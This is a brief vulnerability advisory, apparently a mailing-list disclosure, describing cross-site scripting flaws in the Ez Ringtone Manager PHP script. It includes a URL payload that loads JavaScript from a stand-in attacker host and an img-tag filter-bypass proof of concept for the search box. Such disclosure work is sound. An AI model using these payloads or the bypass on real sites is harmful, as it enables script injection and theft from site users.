Subject: Ez Ringtone Manager from scriptez.net - XSS


Ez Ringtone Manager

Homepage:
http://www.scriptsez.net

Effected files:
player.php
search input box.

XSS Vulnerabilities:

http://example.com/ringtones/player.php?action=preview&id=<SCRIPT%20SRC=http://evilsite.com/xss.js></SCRIPT>&cat=LG%20Mobiles

The search box doesnt properlly filter user input. Tags like <script> are filtered, and backslashes are added for ' and " 

We can get around this by simply using a <img> tag and &#0000039 for '. Poc:
<IMG SRC=javascript:alert(&#0000039XSS&#0000039)>
